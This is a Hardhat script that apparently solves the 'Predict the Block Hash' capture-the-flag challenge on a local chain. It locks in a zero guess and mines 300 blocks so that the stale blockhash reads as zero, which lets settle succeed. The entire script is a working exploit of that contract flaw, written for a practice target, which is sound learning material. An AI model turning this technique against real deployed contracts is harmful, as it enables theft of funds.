const { ethers } = require("hardhat");
const { keccak256 } = require("ethers/lib/utils");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("PredictTheBlockHashChallenge", deployer);

  const mainContract = await MainContract.deploy({ value: ethers.utils.parseEther("1") });
  await mainContract.lockInGuess(ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32), { value: ethers.utils.parseEther("1") });

  for (let i = 0; i < 300; i++) {
    await ethers.provider.send("evm_mine", [(await ethers.provider.getBlock()).timestamp + 1]);
  }

  await mainContract.settle();

  console.log("IS COMPLETE:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
